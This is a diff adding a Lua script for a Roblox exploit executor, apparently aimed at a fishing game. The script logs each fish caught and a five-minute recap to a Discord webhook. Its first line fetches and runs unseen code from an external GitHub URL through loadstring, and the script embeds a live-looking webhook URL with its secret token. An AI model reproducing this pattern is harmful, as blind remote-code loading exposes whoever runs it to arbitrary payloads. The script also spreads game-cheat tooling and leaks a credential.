@@ -1,0 +1,66 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MajestySkie/list/refs/heads/main/games"))()
+
+local WebhookURL = "https://discord.com/api/webhooks/1412018918125604985/MrooiNam55-2xllRRq98Ca2-vl6aurD9LMXC6XkxMwS-kDbBKqkkpZMDZbHbOlEd7OMZ"
+
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function SendWebhook(content)
+    local data = {
+        ["username"] = "FishIt Logger",
+        ["content"] = content
+    }
+    local json = HttpService:JSONEncode(data)
+
+    local req = request or http_request or (syn and syn.request)
+    if req then
+        req({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    end
+end
+
+local TotalFish = 0
+local TotalValue = 0
+local FishList = {}
+
+local CatchEvent = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CatchFish")
+
+CatchEvent.OnClientEvent:Connect(function(fishData)
+    local fishName = fishData.Name or "Unknown"
+    local fishSize = fishData.Size or "?"
+    local fishValue = fishData.Value or 0
+
+    TotalFish = TotalFish + 1
+    TotalValue = TotalValue + fishValue
+    FishList[fishName] = (FishList[fishName] or 0) + 1
+
+    local msg = string.format("🎣 Dapet ikan: **%s**\n📏 Ukuran: %s\n💰 Value: $%s", fishName, fishSize, fishValue)
+    SendWebhook(msg)
+end)
+
+task.spawn(function()
+    while task.wait(300) do
+        if TotalFish > 0 then
+            local summary = "📊 **Rekap 5 Menit**\n"
+            summary = summary .. "Total Ikan: **"..TotalFish.."**\n"
+            summary = summary .. "Total Value: **$"..TotalValue.."**\n\n"
+            summary = summary .. "🐟 Detail Tangkapan:\n"
+
+            for name, count in pairs(FishList) do
+                summary = summary .. "- "..name..": **"..count.."**\n"
+            end
+
+            SendWebhook(summary)
+
+            TotalFish = 0
+            TotalValue = 0
+            FishList = {}
+        end
+    end
+end)
+
+SendWebhook("✅ FishIt Webhook Logger Advanced aktif! Siap pantau tangkapan 🎣")
